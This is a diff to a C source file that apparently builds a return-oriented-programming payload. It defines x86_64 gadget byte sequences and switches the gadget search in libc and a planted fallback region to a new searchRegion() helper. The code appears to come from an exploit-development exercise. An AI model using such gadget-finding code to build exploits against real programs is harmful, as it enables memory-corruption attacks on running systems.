@@ -7,7 +7,6 @@
 #include <unistd.h>
 
 #include "payload.h"
-#include "strnstr.h"
 
 void initload(PayloadPtr plp) {
 	memset(plp, 0, sizeof(*plp));
@@ -15,25 +14,22 @@ void initload(PayloadPtr plp) {
 } // initload()
 
 ssize_t makeload(PayloadPtr plp, BaseAddressesPtr bap, char *p, ssize_t np) {
-	size_t libc_size = getpagesize() * 100;	// Punt
-	size_t fbg_size  = getpagesize() * 1;	// Punt
-
 	// Gadgets as strings (x86_64)
 	char s_popRDI[]	= {0x5f, 0xc3, 0};
 	char s_popRSI[]	= {0x5e, 0xc3, 0};
 	char s_popRDX[]	= {0x5a, 0xc3, 0};
 	char s_nopNOP[]	= {0x90, 0xc3, 0};
 
-	// First try to find gadgets libc
-	Pointer	libc_popRDI = strnstr(bap->libc_base, s_popRDI, libc_size);
-	Pointer	libc_popRSI = strnstr(bap->libc_base, s_popRSI, libc_size);
-	Pointer	libc_popRDX = strnstr(bap->libc_base, s_popRDX, libc_size);
+	// First try to find gadgets in libc
+	Pointer	libc_popRDI = searchRegion(bap->regions + rt_libc, s_popRDI);
+	Pointer	libc_popRSI = searchRegion(bap->regions + rt_libc, s_popRSI);
+	Pointer	libc_popRDX = searchRegion(bap->regions + rt_libc, s_popRDX);
 
 	// Next, get backup gadgets from fallbackGadgets()
-	Pointer fbg_popRDI = strnstr(bap->fbg_base, s_popRDI, fbg_size);
-	Pointer fbg_popRSI = strnstr(bap->fbg_base, s_popRSI, fbg_size);
-	Pointer fbg_popRDX = strnstr(bap->fbg_base, s_popRDX, fbg_size);
-	Pointer fbg_nopNOP = strnstr(bap->fbg_base, s_nopNOP, fbg_size);
+	Pointer	fbg_popRDI = searchRegion(bap->regions + rt_basehook, s_popRDI);
+	Pointer	fbg_popRSI = searchRegion(bap->regions + rt_basehook, s_popRSI);
+	Pointer	fbg_popRDX = searchRegion(bap->regions + rt_basehook, s_popRDX);
+	Pointer	fbg_nopNOP = searchRegion(bap->regions + rt_basehook, s_nopNOP);
 
 	// Things are wrong if I don't find the gadgets in fallbackGadgets()
 	assert(fbg_popRDI != NULL);
